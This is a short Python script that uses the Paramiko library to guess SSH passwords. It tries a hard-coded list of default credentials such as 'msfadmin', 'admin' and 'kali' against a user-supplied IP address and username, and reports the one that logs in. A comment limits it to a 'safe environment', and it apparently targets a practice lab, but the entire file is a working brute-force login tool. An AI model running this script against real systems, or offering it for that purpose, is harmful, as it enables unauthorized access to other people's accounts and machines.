# Import Paramiko library (used to create SSH connections)
import paramiko


# Take user input for remote login
ip = input("Please enter ip: ")
usrname = input("Please enter username: ")

# List of passwords to try (safe environment only)
password = ["msfadmin", "password","Pass","admin", "kali"]

# Loop through each password in the list
for pasw in password:
    try:

        # Create SSH client for each attempt
        ssh = paramiko.SSHClient()

        # Automatically accept unknown host key
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Attempt SSH login using current password
        ssh.connect(ip, username= usrname , password = pasw)

         # If no exception occurs, login is successful
        print(f"Login successful! Password is: {pasw}")

        # Close the SSH connection
        ssh.close()

        # Stop trying passwords after success
        break

    # Catch authentication failure exception
    except paramiko.AuthenticationException:
        print(f"Login failed for password: {pasw}")
    

